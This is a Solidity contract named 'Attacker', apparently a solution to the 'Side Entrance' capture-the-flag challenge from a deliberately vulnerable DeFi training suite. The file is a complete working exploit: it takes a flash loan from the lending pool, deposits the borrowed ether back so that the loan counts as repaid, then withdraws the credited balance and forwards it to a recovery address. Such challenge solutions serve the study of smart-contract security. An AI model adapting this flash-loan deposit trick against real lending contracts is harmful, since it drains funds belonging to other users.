// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;
    SideEntranceLenderPool private victim;
    address private recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        victim = _pool;
        recovery = _recovery;
    }

    function flashLoan() public {
        victim.flashLoan(ETHER_IN_POOL);

        victim.withdraw();
    }

    function execute() external payable override {
        victim.deposit{value: ETHER_IN_POOL}();
    }

    function withdraw() public {
        (bool success,) = recovery.call{value: ETHER_IN_POOL}("");
        require(success, "ETH transfer failed");
    }

    receive() external payable {}
}
